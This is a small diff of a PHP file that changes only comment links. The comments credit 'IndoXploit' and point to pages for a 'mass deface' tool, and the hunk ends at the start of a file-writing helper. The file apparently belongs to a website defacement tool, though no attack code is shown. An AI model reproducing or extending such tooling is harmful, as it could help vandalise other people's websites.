@@ -1,7 +1,8 @@
 <?php
 // Tu5b0l3d -IndoXploit-
 // http://indoxploit.blogspot.co.id/2016/04/tool-mass-deface.html
-// anon6host.my.id
+// https://anon6host.my.id
+// https://anon6host.my.id/sharingan-mass-deface.html
 
 function bikin_file($namafile,$script){
 $fp2 = fopen($namafile,"w");
